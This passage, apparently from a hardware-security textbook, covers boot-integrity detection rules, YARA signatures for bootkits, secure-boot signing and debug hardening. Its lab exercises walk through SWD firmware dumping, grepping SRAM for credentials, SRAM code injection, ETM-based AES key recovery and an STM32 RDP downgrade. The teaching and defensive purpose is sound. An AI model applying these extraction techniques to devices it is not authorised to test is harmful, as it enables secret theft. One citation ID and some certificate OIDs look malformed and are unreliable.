            echo "FAIL: STM32 RDP level is $RDP (expected 2)"
            FAIL=1
        fi
        ;;
    nrf52)
        # Read APPROTECT register
        AP=$(nrfjprog --memrd 0x10001208 --n 4 2>&1 | grep -oP '0x\K[0-9A-F]+')
        if [ "$AP" != "00000000" ]; then
            echo "FAIL: nRF52 APPROTECT is 0x$AP (expected 0x00000000)"
            FAIL=1
        fi
        ;;
    esp32)
        # Read eFuse summary
        EFUSE=$(espefuse.py summary 2>&1)
        if ! echo "$EFUSE" | grep -q "JTAG_DISABLE.*True"; then
            echo "FAIL: ESP32 JTAG_DISABLE eFuse not burned"
            FAIL=1
        fi
        if ! echo "$EFUSE" | grep -q "ABS_DONE_1.*True"; then
            echo "FAIL: ESP32 ABS_DONE_1 (secure boot) eFuse not burned"
            FAIL=1
        fi
        ;;
esac

exit $FAIL
```

**Rule 7 — UEFI variable modification (dbx/PK/KEK) detection.** Monitor modifications to Secure Boot UEFI variables outside of authorized update windows.

```python
# UEFI variable change monitor — Linux (reads from efivarfs)
import os, hashlib, json, time

EFIVARFS = "/sys/firmware/efi/efivars"
MONITORED_VARS = {
    "PK-8be4df61-93ca-11d2-aa0d-00e098032b8c": "Platform Key",
    "KEK-8be4df61-93ca-11d2-aa0d-00e098032b8c": "Key Exchange Key",
    "db-d719b2cb-3d3a-4596-a3bc-dad00e67656f": "Signature Database",
    "dbx-d719b2cb-3d3a-4596-a3bc-dad00e67656f": "Forbidden Signatures",
}

def hash_var(var_name):
    path = os.path.join(EFIVARFS, var_name)
    if not os.path.exists(path):
        return None
    with open(path, "rb") as f:
        data = f.read()
    return hashlib.sha256(data).hexdigest()

def monitor_loop(baseline_file="/var/lib/secboot/uefi_baseline.json",
                 interval=300):
    # Load or create baseline
    if os.path.exists(baseline_file):
        with open(baseline_file, "r") as f:
            baseline = json.load(f)
    else:
        baseline = {}
        for var, desc in MONITORED_VARS.items():
            baseline[var] = hash_var(var)
        os.makedirs(os.path.dirname(baseline_file), exist_ok=True)
        with open(baseline_file, "w") as f:
            json.dump(baseline, f, indent=2)
        return

    while True:
        for var, desc in MONITORED_VARS.items():
            current = hash_var(var)
            if current != baseline.get(var):
                alert_msg = (
                    f"CRITICAL: UEFI variable {desc} ({var}) changed. "
                    f"Baseline: {baseline.get(var, 'N/A')}, "
                    f"Current: {current}"
                )
                send_siem_alert(alert_msg)  # send to SIEM/SOAR pipeline
                # Update baseline only after human review
        time.sleep(interval)
```

**Rule 8 — Chassis intrusion and hardware tamper monitoring.** For systems with discrete TPM and BMC (Baseboard Management Controller), monitor chassis intrusion switches and TPM locality indicators.

```yaml
# Sigma rule — chassis intrusion event (IPMI/BMC)
title: Physical Chassis Intrusion Detected
id: f4a5b6c7-9d0e-4f1a-b2c3-d4e5f6a78901
status: stable
logsource:
    product: ipmi
    category: sel  # System Event Log
detection:
    selection:
        EventType: "Physical Security"
        EventData|contains:
            - "chassis intrusion"
            - "chassis opened"
            - "cover removed"
    condition: selection
level: high
tags:
    - attack.initial_access
    - attack.t1200
```

### 11.2 YARA rules: bootkit and debug tool artifact signatures

The BlackLotus YARA rules are defined in §7.7. The following rules cover additional bootkit families and debug tool artifacts that indicate unauthorized hardware access.

```yaml
rule ESPecter_Bootkit {
    meta:
        description = "Detects ESPecter UEFI/MBR bootkit artifacts"
        reference = "ESET Research, 2021"
        severity = "CRITICAL"

    strings:
        // ESPecter modifies Windows Boot Manager on ESP
        $esp_path = "\\EFI\\Microsoft\\Boot\\" wide
        // ESPecter driver persistence strings
        $driver_reg = "\\Registry\\Machine\\System\\CurrentControlSet\\Services\\" wide
        // ESPecter disables DSE (Driver Signature Enforcement)
        $dse_patch = { 48 8B 05 ?? ?? ?? ?? 48 85 C0 74 ?? B8 00 00 00 00 }
        // ESPecter kernel callback registration
        $callback = "PsSetCreateProcessNotifyRoutine" ascii
        // MBR infection marker (for BIOS-mode ESPecter)
        $mbr_sig = { EB 5A 90 ?? ?? ?? ?? ?? 4E 54 46 53 }
        // ESPecter C2 communication pattern
        $c2_ua = "Mozilla/5.0 (Windows NT 10.0; Win64; x64)" ascii
        $c2_path = "/update/check" ascii

    condition:
        (uint16(0) == 0x5A4D) and (3 of them)
}

rule MosaicRegressor_UEFI_Implant {
    meta:
        description = "Detects MosaicRegressor UEFI firmware implant (SPI flash)"
        reference = "Kaspersky GReAT, 2020"
        severity = "CRITICAL"

    strings:
        // MosaicRegressor DXE driver characteristics
        $dxe_guid = { 8C 29 3D ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? ?? }
        // File dropper component (drops payload to Windows filesystem)
        $dropper_path = "\\Windows\\Temp\\" wide
        // NTFS write from DXE context (abnormal for legitimate DXE drivers)
        $ntfs_write = "NtfsWrite" ascii
        // Persistence mechanism — registers as runtime service
        $runtime_svc = "EFI_RUNTIME_SERVICES" ascii
        // Compressed payload marker
        $payload_hdr = { 78 9C }  // zlib header
        // SPI flash region markers (firmware volume GUID)
        $fv_guid = { 78 E5 8C 8C 3D 8A 1C 4F 99 35 89 61 85 C3 2D D3 }

    condition:
        (4 of them) and filesize < 2MB
}

rule Debug_Tool_Artifacts_Firmware {
    meta:
        description = "Detects remnants of debug tools in firmware filesystem"
        severity = "HIGH"

    strings:
        // OpenOCD configuration remnants
        $openocd_cfg = "adapter speed" ascii
        $openocd_target = "target create" ascii
        // J-Link GDB server artifacts
        $jlink_gdb = "JLinkGDBServerCL" ascii
        $jlink_script = "JLinkScript" ascii
        // JTAG/SWD tool fingerprints
        $jtag_boundary = "BSDL" ascii
        $swd_connect = "SWJ-DP" ascii
        // ChipWhisperer glitch artifacts
        $cw_glitch = "scope.glitch" ascii
        $cw_arm = "scope.arm()" ascii
        // Unauthorized debug stub (common in compromised firmware)
        $debug_stub = { E7 FE DE FF }  // ARM BKPT + UDF (debug breakpoint pair)
        // GDB stub strings (should not be in production firmware)
        $gdb_stub = "GDBServer" ascii
        $gdb_packet = "$qSupported" ascii

    condition:
        (3 of them)
}
```

### 11.3 Hardware tamper detection: TPM attestation and chassis monitoring

**TPM attestation verification workflow.** For devices protected by measured boot, the attestation verification process must be performed regularly (minimum: every boot cycle for high-security environments, daily for standard deployments).

The verification chain: (1) the verifier sends a freshly generated nonce to the device, (2) the device requests a TPM quote (TPM2_Quote) specifying the PCRs of interest and the nonce, (3) the TPM signs the PCR values and nonce with the device's Attestation Key (AK), (4) the device returns the quote, the AK certificate chain, and the TCG Event Log, (5) the verifier validates the AK certificate chain (tracing to the TPM manufacturer's CA), verifies the quote signature, confirms the nonce matches, and compares the PCR values against known-good baselines.

**Supply chain boot integrity verification.** For high-value deployments (government, critical infrastructure, financial), boot integrity verification should extend to the supply chain: (1) the OEM provides reference firmware hashes and expected PCR values for each hardware SKU and firmware version, (2) incoming inspection measures the device's SPI flash contents (via external SPI flash reader, without trusting the device's own firmware) and compares the hash against the OEM's reference, (3) first-boot attestation records the baseline PCR values, (4) periodic re-attestation detects any subsequent modification. This process defends against supply chain implants (pre-installed bootkits or modified firmware shipped from a compromised manufacturing facility) and evil-maid attacks (post-delivery firmware modification during transit).

---

## 12. Debug interface hardening and secure boot deployment

### 12.1 JTAG/SWD disable methodologies

Three tiers of debug disabling, in ascending order of robustness:

**Tier 1 — Software disable (development only, NOT for production).** The firmware writes to a debug-disable register (DEMCR.VC_CORERESET clear, DHCSR lock) during initialization. Trivially bypassed by halting at reset or glitching the disable instruction (§7.5). Acceptable only during development as a convenience measure.

**Tier 2 — OTP fuse disable (standard production).** One-time-programmable fuses permanently disable the debug interface at the hardware level. The SoC's boot logic reads the fuse before enabling the debug TAP or DAP. Examples: STM32 RDP Level 2, nRF52 APPROTECT, ESP32 JTAG_DISABLE, NXP JTAG_DIS. Bypass requires fault injection (§7.5). This is the minimum acceptable protection for production devices.

**Tier 3 — Authenticated debug (high-security).** Debug access is gated by cryptographic authentication. The debug interface remains physically present but is inert until a valid credential is presented. This allows authorized debug in the field (e.g., for failure analysis of returned units) without leaving the interface permanently open. Implementations: ARM SDC-600, Infineon DAP authentication, NXP Secure JTAG, custom vendor implementations.

### 12.2 Debug authentication: ARM Secure Debug and certificate-based unlock

**ARM CoreSight Secure Debug Channel (SDC-600).** SDC-600 defines a standardized debug authentication protocol built on TLS 1.3. The debug probe (authenticator) and the target device (responder) perform a mutual authentication handshake through the CoreSight debug interface. The protocol:

1. The debug probe connects to the target's DAP and accesses the SDC-600 component via the ROM Table.
2. The probe sends a ClientHello containing its certificate and supported cipher suites.
3. The target's SDC-600 hardware validates the probe's certificate against a root CA stored in the target's OTP fuses.
4. The target responds with a ServerHello containing its own certificate (proving device identity).
5. Both sides derive session keys and establish an encrypted channel.
6. The target asserts the appropriate debug authentication signals (DBGEN, SPIDEN, etc.) based on the probe's certificate attributes (e.g., a "non-secure debug only" certificate asserts DBGEN but not SPIDEN).

The SDC-600 certificate contains extensions that specify the debug scope: which debug signals to assert, which harts/cores to enable, and an optional time-limited validity window (allowing temporary debug access that expires automatically). Key management: the target's root CA certificate hash is burned into OTP fuses during manufacturing. The OEM maintains the CA and issues debug certificates to authorized personnel (field engineers, security researchers under NDA). Certificate revocation uses a CRL (Certificate Revocation List) embedded in the target's firmware, updated via firmware updates.

**Certificate-based debug unlock — practical deployment.**

```bash
# Generate the debug CA hierarchy
# Root CA (kept offline in HSM)
openssl req -new -x509 -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
        -subj "/CN=Debug Root CA/" \
        -keyout debug_root_ca.key -out debug_root_ca.crt \
        -days 7300 -sha256

# Issuing CA (used by the debug certificate server)
openssl req -new -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
        -subj "/CN=Debug Issuing CA/" \
        -keyout debug_issuing_ca.key -out debug_issuing_ca.csr
openssl x509 -req -in debug_issuing_ca.csr \
        -CA debug_root_ca.crt -CAkey debug_root_ca.key \
        -CAcreateserial -out debug_issuing_ca.crt \
        -days 3650 -sha256 \
        -extfile <(echo "basicConstraints=CA:TRUE,pathlen:0
                         keyUsage=keyCertSign,cRLSign")

# Debug engineer certificate (time-limited: 24 hours)
openssl req -new -newkey ec -pkeyopt ec_paramgen_curve:P-256 \
        -subj "/CN=Debug Engineer - J.Smith/OU=HW Security/" \
        -keyout engineer_debug.key -out engineer_debug.csr
openssl x509 -req -in engineer_debug.csr \
        -CA debug_issuing_ca.crt -CAkey debug_issuing_ca.key \
        -CAcreateserial -out engineer_debug.crt \
        -days 1 -sha256 \
        -extfile <(echo "keyUsage=digitalSignature
                         extendedKeyUsage=1.3.6.1.4.1.arm.sdc.debugAuth
                         # Custom extension: debug scope
                         1.3.6.1.4.1.arm.sdc.debugScope=ASN1:UTF8:nonsecure")

# Burn root CA hash into target's OTP (platform-specific)
# The hash is SHA-256 of the DER-encoded root CA certificate
openssl x509 -in debug_root_ca.crt -outform DER | sha256sum
# Program this hash into the SoC's debug auth fuse bank
```

### 12.3 Secure boot implementation guide: key ceremony and signing infrastructure

**Key generation ceremony.** The root-of-trust key for secure boot is the most critical cryptographic asset in the platform's security model. Its generation must follow a formal ceremony:

1. **Air-gapped HSM.** Generate the root signing key inside a FIPS 140-2 Level 3 (or higher) HSM (Thales Luna, Utimaco SecurityServer, AWS CloudHSM for cloud-managed keys). The private key must never leave the HSM boundary. Export only the public key (or public key hash) for fuse programming.

2. **Key hierarchy.** Establish a multi-level key hierarchy to limit the root key's exposure:
   - Root key (in HSM, used only to sign subordinate keys, maximum 5-year validity)
   - Signing key (in HSM, used to sign firmware images, 1-2 year validity, rotatable)
   - Anti-rollback counter increment authorized only by root key holder

3. **Multi-party control.** Require M-of-N authorization (e.g., 3-of-5 key custodians) for any operation involving the root key: signing a subordinate key, revoking a key, or incrementing the anti-rollback counter. Each custodian holds a key share stored on a personal hardware token (YubiKey, Nitrokey).

4. **Ceremony audit.** Record the entire ceremony: video recording, signed witness statements, serial numbers of all hardware involved, SHA-256 hashes of all generated artifacts. Store the audit record in a tamper-evident container (sealed envelope, digitally signed archive).

**Signing infrastructure.**

```bash
# Firmware signing with NXP i.MX HAB (High Assurance Boot) as example
# Step 1: Generate SRK (Super Root Key) table — 4 keys for redundancy
# (Performed during key ceremony on air-gapped HSM workstation)
cd /opt/nxp-cst/keys/
./hab4_pki_tree.sh  # interactive script generates the key hierarchy
# Outputs: SRK_1_sha256_4096_65537_{cert,key}.pem (×4 SRK slots)
#          CSF_1_sha256_4096_65537_{cert,key}.pem (signing key)
#          IMG_1_sha256_4096_65537_{cert,key}.pem (image key)

# Step 2: Generate SRK table and fuse hash
srktool -h 4 -t SRK_table.bin -e SRK_fuse.bin \
        -d sha256 -c \
        SRK_1_sha256_4096_65537_cert.pem,\
        SRK_2_sha256_4096_65537_cert.pem,\
        SRK_3_sha256_4096_65537_cert.pem,\
        SRK_4_sha256_4096_65537_cert.pem

# The SRK_fuse.bin contains the 256-bit hash to burn into OTP
hexdump -C SRK_fuse.bin

# Step 3: Create CSF (Command Sequence File) for firmware image
cat > csf_uboot.txt <<'CSFEOF'
[Header]
  Version = 4.3
  Hash Algorithm = sha256
  Engine = CAAM
  Engine Configuration = 0
  Certificate Format = X509
  Signature Format = CMS

[Install SRK]
  File = "SRK_table.bin"
  Source index = 0

[Install CSFK]
  File = "CSF_1_sha256_4096_65537_cert.pem"

[Authenticate CSF]

[Install Key]
  Verification index = 0
  Target index = 2
  File = "IMG_1_sha256_4096_65537_cert.pem"

[Authenticate Data]
  Verification index = 2
  Blocks = 0x877FF000 0x000 0x0002E000 "u-boot-dtb.imx"
CSFEOF

# Step 4: Sign the firmware image
cst --o csf_uboot.bin --i csf_uboot.txt

# Step 5: Concatenate signed firmware
objcopy -I binary -O binary --pad-to=0x2E000 u-boot-dtb.imx u-boot-padded.imx
cat u-boot-padded.imx csf_uboot.bin > u-boot-signed.imx

# Step 6: Program SRK hash fuses (IRREVERSIBLE — verify before burning)
# On the target device via U-Boot:
# => fuse prog 3 0 0xABCDEF01  (SRK fuse bank, word 0)
# => fuse prog 3 1 0x23456789  (SRK fuse bank, word 1)
# ... (8 words total for 256-bit hash)

# Step 7: Close the device (enable secure boot enforcement)
# => fuse prog 0 6 0x00000002  (SEC_CONFIG = Closed)
# WARNING: After closing, only signed firmware will boot
```

### 12.4 TPM-based measured boot deployment

**PCR allocation strategy.** The TCG PC Client Platform Firmware Profile defines the standard PCR allocation:

| PCR | Measurement |
|-----|-------------|
| 0 | SRTM, BIOS, host platform extensions, embedded option ROMs |
| 1 | Host platform configuration (BIOS settings) |
| 2 | Option ROM code |
| 3 | Option ROM configuration and data |
| 4 | IPL code (MBR/boot loader) |
| 5 | IPL configuration and data (boot loader config) |
| 6 | State transitions and wake events |
| 7 | Secure Boot state (PK, KEK, db, dbx, Secure Boot enabled/disabled) |
| 8–15 | OS-defined (Linux IMA uses PCR 10; Windows uses PCR 11–13) |

**Attestation server architecture.** The attestation server maintains: (1) a device registry (device ID → AK certificate, expected PCR values per firmware version), (2) a firmware database (firmware version → expected PCR values for each PCR), (3) a nonce generator (cryptographically random, single-use), and (4) an alerting pipeline (integration with SIEM/SOAR for anomaly notification).

The attestation flow:

```
Device                    Attestation Server
  |                              |
  |<--- nonce ------------------|  (1) Server generates random nonce
  |                              |
  |  TPM2_Quote(nonce, PCRs)     |
  |  PCR values + event log      |
  |--- quote + AK cert -------->|  (2) Device returns signed quote
  |                              |
  |                        Verify AK cert chain
  |                        Verify quote signature
  |                        Verify nonce in quote
  |                        Compare PCRs vs baseline
  |                        Parse event log for anomalies
  |                              |
  |<--- OK / REMEDIATE ---------|  (3) Server returns verdict
```

### 12.5 UEFI hardening: enforcement and dbx automation

**Secure Boot enforcement verification.** Production systems must enforce Secure Boot (not just enable it). Verify enforcement state:

```bash
# Linux: verify Secure Boot is enforced
mokutil --sb-state
# Expected: "SecureBoot enabled"

# Verify no Setup Mode (PK must be enrolled)
efi-readvar -v PK | head -5
# Should show a valid certificate, not "Variable is empty"

# Verify dbx is current (compare against UEFI.org revocation list)
efi-readvar -v dbx -o current_dbx.esl
# Compare hash against the latest published dbx from
# https://uefi.org/revocationlistfile
sha256sum current_dbx.esl

# Windows: verify via PowerShell
Confirm-SecureBootUEFI  # returns True if enforced
Get-SecureBootPolicy    # shows policy details
```

**Automated dbx update deployment.** The dbx (Forbidden Signature Database) must be kept current to revoke known-compromised binaries. Automation:

```bash
#!/bin/bash
# dbx update automation — runs as a cron job or systemd timer
# Downloads the latest dbx from UEFI.org and applies it

DBX_URL="https://uefi.org/sites/default/files/resources/dbx_info.csv"
DBX_UPDATE_URL="https://uefi.org/revocationlistfile"
LOCAL_DBX="/var/lib/secboot/latest_dbx.bin"
LOG="/var/log/secboot/dbx_update.log"

echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] Starting dbx update check" >> "$LOG"

# Download latest dbx (verify TLS — do NOT skip cert verification)
curl -sSf -o /tmp/dbx_latest.bin "$DBX_UPDATE_URL" 2>>"$LOG"
if [ $? -ne 0 ]; then
    echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] FAIL: download failed" >> "$LOG"
    exit 1
fi

# Compare with currently applied dbx
NEW_HASH=$(sha256sum /tmp/dbx_latest.bin | cut -d' ' -f1)
if [ -f "$LOCAL_DBX" ]; then
    OLD_HASH=$(sha256sum "$LOCAL_DBX" | cut -d' ' -f1)
    if [ "$NEW_HASH" = "$OLD_HASH" ]; then
        echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] dbx is current" >> "$LOG"
        exit 0
    fi
fi

# New dbx available — validate and stage for application
# The dbx update must be signed by a KEK holder
# Apply via fwupd (recommended) or efi-updatevar
fwupdtool security --force 2>>"$LOG"
cp /tmp/dbx_latest.bin "$LOCAL_DBX"
echo "[$(date -u +%Y-%m-%dT%H:%M:%SZ)] dbx updated: $NEW_HASH" >> "$LOG"
```

### 12.6 Hardware security module integration for boot signing

**HSM-backed firmware signing pipeline.** Production firmware signing must never use keys stored on developer workstations. The signing pipeline integrates an HSM to protect the signing key:

```
Developer → Build Server → HSM Signing Service → Signed Artifact Repository
    |              |                |                        |
  Source       Unsigned          Signed                  Signed
  code         firmware          firmware                firmware
               (CI/CD)          (PKCS#11)               (deployed)
```

**PKCS#11 integration for firmware signing.** Most HSMs expose a PKCS#11 interface. The signing tool (NXP CST, imgtool for MCUboot, sbsign for UEFI) can be configured to use the HSM via a PKCS#11 provider instead of a local key file.

```bash
# MCUboot image signing via HSM (PKCS#11)
# Configure the PKCS#11 module for the HSM
export PKCS11_MODULE_PATH="/usr/lib/libsofthsm2.so"  # or vendor HSM .so

# Sign firmware image using key stored in HSM
# imgtool (MCUboot signing tool) with PKCS#11 backend
imgtool sign \
    --key "pkcs11:token=FirmwareSigningHSM;object=boot-signing-key;type=private" \
    --align 4 \
    --version 2.1.0 \
    --security-counter 15 \
    --header-size 0x200 \
    --slot-size 0x60000 \
    --pad \
    app_unsigned.bin \
    app_signed.bin

# Verify the signed image (using the public key extracted from HSM)
imgtool verify \
    --key boot-signing-key-pub.pem \
    app_signed.bin
# Expected: "Image OK"

# For UEFI signing via PKCS#11
sbsign --engine pkcs11 \
       --key "pkcs11:token=UEFISigningHSM;object=db-signing-key" \
       --cert db_signing.crt \
       --output bootx64_signed.efi \
       bootx64.efi
```

**Key rotation procedure.** Signing keys should be rotated periodically (annually for signing keys, every 5 years for root keys). The rotation process for secure boot:

1. Generate a new signing key in the HSM.
2. Issue a firmware update signed with the current key that installs the new key's certificate into the device's trust store (for devices that support multiple signing keys — NXP HAB supports 4 SRK slots, UEFI db supports multiple certificates).
3. Subsequent firmware updates are signed with the new key.
4. After confirming all devices have received the key update, revoke the old key (remove from db, add old key hash to dbx, or burn SRK_REVOKE fuse for the old SRK slot).
5. Increment the anti-rollback counter to prevent downgrade to firmware signed with the old key.

---

## 13. Cross-references

**To Domain 12B (firmware RE).** JTAG/SWD (§1, §2) are the primary debug interfaces for dynamic firmware analysis: the analyst connects to the device's debug port, halts the processor, sets breakpoints in the firmware, and single-steps through security-critical code paths (Domain 12B §2.2). CoreSight ETM trace (§3.3) provides instruction-level execution tracing without halting the processor, enabling non-intrusive firmware analysis. The firmware extracted via memory extraction (Chapter 17C §5) is analyzed using the static analysis techniques described in Domain 12A.

**To Domain 17B (fault injection).** Fault injection targets the secure boot verification described in §5 (the signature check at each boot stage). The precise timing for the glitch is determined by profiling the boot power trace (Chapter 17B §1.6) to identify the clock cycle of the verification comparison. STM32 RDP bypass (Chapter 17B §8.2), ESP32 secure boot bypass (Chapter 17B §8.3), and nRF52 APPROTECT bypass (Chapter 17B §8.4) are specific instances of glitching the debug-lockout and secure-boot mechanisms described here.

**To Domain 17C (PCB RE).** Debug interface discovery (§4) depends on PCB reverse engineering to identify test points and pin assignments (Chapter 17C §1.1, §1.7). Memory extraction (Chapter 17C §5) provides the firmware images that secure boot protects. Counterfeit IC detection (Chapter 17C §2.3) and hardware Trojan detection (Chapter 17C §6) are related supply chain security concerns.

**To Domain 15 (mobile security).** iOS SecureBoot (§5.6) is covered in depth in Domain 15B §1.4–1.6, including the checkm8 BootROM exploit, SEP boot chain, and SHSH blob mechanics. Android Verified Boot (§5.6) is covered in Domain 15A §2.3, including dm-verity, vbmeta, and bootloader unlocking.

**To Domain 27 (defensive architecture).** TPM-based measured boot and remote attestation (§7.2) are covered in depth in Domain 27A (secure boot, TPM, confidential computing). The detection engineering aspects of boot-integrity monitoring feed into the SIEM/SOAR pipeline described in Domain 27C.

**To Domain 7B (hardware vulnerabilities).** Intel CSME and AMD PSP vulnerabilities (referenced in §5.4, §5.5) are covered in Domain 7B. CVE-2019-0090 (CSME BootROM vulnerability) enables persistent platform compromise that bypasses all software-level boot verification. AMD PSP vulnerabilities (CVE-2021-26311 and related) compromise the platform root of trust at the silicon level, undermining both Boot Guard and fTPM guarantees.

**To Domain 2 (OS primitives and capabilities).** The debug authentication signals (DBGEN, SPIDEN, §3.4) parallel the principle of least privilege in software: debug capabilities should be minimized to the narrowest scope required. The capability model (Domain 2C) maps directly to the tiered debug access model where different authentication levels grant different debug scopes (non-secure only, or non-secure plus secure).

---

## 14. Exercises

**Exercise 17.4-1 — JTAG chain enumeration and boundary scan on unknown hardware.**
Using a JTAGulator (or Glasgow Interface Explorer) and a target board with at least one JTAG-enabled IC: (a) Connect the JTAGulator to up to 12 candidate pins on the target (test points, unpopulated headers, IC pins identified during PCB RE). Run the IDCODE scan — document the pin permutation algorithm's progress and the discovered JTAG pinout (TCK, TMS, TDI, TDO). (b) Record the 32-bit IDCODE(s) returned. Decode each: extract the manufacturer ID (bits [11:1], look up in JEDEC JEP106), part number (bits [27:12]), and version (bits [31:28]). (c) If a BSDL file is available for the identified IC: load it into OpenOCD and perform a SAMPLE/PRELOAD operation to capture the current state of all boundary-scan cells. Identify which pins are inputs vs. outputs and their current logical state. (d) Using EXTEST: toggle one output pin (a GPIO or LED pin) via boundary scan — verify the toggle with an oscilloscope or multimeter. Deliverable: JTAGulator scan log, decoded IDCODE table, boundary-scan register dump with pin-function annotations, and EXTEST toggle verification.

**Exercise 17.4-2 — SWD firmware extraction and RAM scraping on ARM Cortex-M.**
Using an OpenOCD-compatible debug probe (ST-Link, J-Link, CMSIS-DAP) and an ARM Cortex-M target (STM32F4 Discovery, nRF52-DK with debug enabled, or RP2040): (a) Connect via SWD. Read DPIDR to confirm connectivity. Power up the debug domain (set CSYSPWRUPREQ/CDBGPWRUPREQ in CTRL/STAT). Enumerate the ROM Table using `dap info` — document all CoreSight components and their base addresses. (b) Dump the full flash image: `dump_image firmware.bin 0x08000000 0x100000` (adjust base address and size per target). Verify the dump by computing SHA-256 and comparing with a second read. (c) Halt the CPU (`halt`). Dump the full SRAM: `dump_image sram.bin 0x20000000 0x20000`. Search the SRAM dump for potential secrets: use `strings sram.bin | grep -i "pass\|key\|token\|ssid"` and `aeskeyfind sram.bin`. (d) Inspect the DBGAUTHSTATUS register (0xE000EFB8) — document which debug authentication signals are enabled (DBGEN, NIDEN, SPIDEN, SPNIDEN). (e) Demonstrate code injection: write a 4-byte NOP sled + infinite-loop to SRAM, set PC to the SRAM address (`reg pc 0x20001000`), and resume. Verify the CPU is executing the injected code by observing the PC stuck in the loop. Deliverable: ROM Table enumeration output, firmware dump with hash verification, SRAM secret-search results, DBGAUTHSTATUS analysis, and code-injection evidence.

**Exercise 17.4-3 — CoreSight ETM trace analysis for cryptographic key extraction.**
Using a trace-capable debug probe (Segger J-Trace, ARM DSTREAM, or Lauterbach PowerTrace) and a target running software AES-128 with ETM trace enabled (NIDEN=1): (a) Configure ETM to trace instruction execution during AES encryption of a known plaintext. Capture the full trace stream via TPIU/SWO. (b) In the trace viewer, identify the AES S-box lookup instructions (typically table-indexed loads from a fixed base address). Record the memory addresses accessed during each S-box lookup — these addresses directly encode the S-box input byte. (c) Correlate the S-box inputs with the known plaintext to recover the round-0 AddRoundKey output (which equals plaintext XOR key for round 0). Compute the AES-128 key. (d) Assess the residual risk: if NIDEN were set to 0 (trace disabled), document which information leakage vector remains (SPA via power trace vs. ETM trace). Deliverable: ETM trace capture file, annotated S-box address trace, recovered key with verification, and the NIDEN risk assessment.

**Exercise 17.4-4 — Secure boot architecture analysis and attack surface assessment.**
Select a target platform with documented secure boot (STM32 with HAL secure boot, NXP i.MX with HABv4, Raspberry Pi, or ESP32): (a) Document the complete boot chain: identify each boot stage (BootROM → BL1 → BL2 → OS), the signature algorithm used at each stage, the key storage mechanism (OTP fuses, embedded in ROM, external flash), and the anti-rollback mechanism (if any). (b) Assess the attack surface at each stage: can the BootROM be updated (mask ROM = no)? Is the bootloader in writable flash (SPI NOR = yes, potentially modifiable)? Are debug interfaces accessible during boot (SWD available before debug lockout asserts)? Is there a DFU/recovery USB mode (potential USB stack vulnerability surface)? (c) For NXP HABv4: read the SEC_CONFIG fuse value (via JTAG if accessible or via the HAB status area in OCRAM). Determine whether the device is in Open or Closed mode. If Open: demonstrate that unsigned code boots successfully. (d) For UEFI: use `chipsec` to audit Secure Boot configuration: `chipsec_main --module common.secureboot.variables` — document PK, KEK, db, and dbx contents. Deliverable: boot-chain diagram, per-stage attack surface matrix, fuse/configuration audit results, and a prioritized vulnerability assessment.

**Exercise 17.4-5 — STM32 RDP Level 1 downgrade and SRAM secret recovery.**
Using an STM32F4 Discovery board with RDP Level 1 configured: (a) Verify RDP Level 1: connect via SWD with OpenOCD — confirm that flash read commands return all-zeros or trigger a fault, while SRAM read succeeds. Read the FLASH_OBR register to confirm the RDP level byte. (b) Load a test firmware that stores a known AES-128 key in SRAM during operation. Power the board and let the firmware run for 10 seconds (key is now in SRAM). (c) Without power-cycling: issue the mass-erase command via OpenOCD (`stm32f4x mass_erase 0`). The flash is erased and RDP reverts to Level 0. (d) Immediately after mass erase: dump the SRAM (`dump_image sram_post_erase.bin 0x20000000 0x20000`). Search for the known AES key using `aeskeyfind` or direct byte search. (e) Document: was the key recovered from SRAM after mass erase? Discuss the security implication (mass erase clears flash but may not clear SRAM, leaving residual secrets accessible). Recommend countermeasures (software key zeroization on tamper detection, RDP Level 2 for production). Deliverable: RDP verification log, mass-erase command log, SRAM dump with key-search results, and a countermeasure recommendation.

---

## 15. Readings and References

- ARM, "ARM Debug Interface Architecture Specification ADIv5.2," ARM IHI 0031F
- ARM, "ARM CoreSight Architecture Specification v3.0," ARM IHI 0029E
- IEEE, "IEEE 1149.1-2013: Standard for Test Access Port and Boundary-Scan Architecture"
- IEEE, "IEEE 1149.7-2009: Standard for Reduced-Pin and Enhanced-Functionality Test Access Port"
- OpenOCD Project, "OpenOCD User's Guide," https://openocd.org/doc/html/index.html (retrieved: 2026-05-29)
- pyOCD Project, "pyOCD Documentation," https://pyocd.io/ (retrieved: 2026-05-29)
- Grand, Joe, "JTAGulator — Assisted Discovery of On-Chip Debug Interfaces," https://github.com/grandideastudio/jtagulator (retrieved: 2026-05-29)
- Xu, axi0mX, "checkm8 — Permanent, Unpatchable Bootrom Exploit for Apple A5-A11," CVE-2019-8900, https://github.com/axi0mX/ipwndfu (retrieved: 2026-05-29)
- Eclypsium, "Hydrophobia and UEFI Secure Boot Bypass Vulnerabilities (CVE-2025-427)," https://eclypsium.com/blog/hydrophobia-secure-boot-bypass-vulnerabilities/ (retrieved: 2026-05-29)
- Marcussen, Thomas, "BlackLotus and the 2026 Secure Boot Certificate Expiry," https://blog.thomasmarcussen.com/secure-boot-certificate-expiry-2026-blacklotus/ (retrieved: 2026-05-29)
- Microsoft, "Managing Windows Boot Manager Revocations for CVE-2023-24932 (BlackLotus)," https://support.microsoft.com/en-us/topic/how-to-manage-the-windows-boot-manager-revocations-for-secure-boot-changes-associated-with-cve-2023-24932-41a975df-beb2-40c1-99a3-b3ff139f832d (retrieved: 2026-05-29)
- NSA/CISA, "Guidance for Managing UEFI Secure Boot," https://media.defense.gov/2025/Dec/11/2003841096/-1/-1/0/CSI_UEFI_SECURE_BOOT.PDF (retrieved: 2026-05-29)
- LimitedResults, "nRF52 Debug Resurrection (APPROTECT Bypass)," CVE-2020-27211
- Matrosov, Alex (Binarly), "UEFI Firmware Vulnerabilities — Past, Present, and Future," Black Hat USA 2023
- Aviatrix, "Framework 2025 Signed UEFI Shell Secure Boot Bypass," https://aviatrix.ai/threat-research-center/framework-2025-signed-uefi-shell-secure-boot-bypass/ (retrieved: 2026-05-29)

---

## 16. Cross-References (tabular)

| Domain/Chapter | Topic | Relationship to This Chapter |
|---|---|---|
| Domain 12B (Firmware RE) | Firmware analysis, dynamic debugging | JTAG/SWD (§1, §2) are primary interfaces for Domain 12B dynamic analysis; CoreSight ETM trace (§3.3) enables non-intrusive instruction-level firmware tracing |
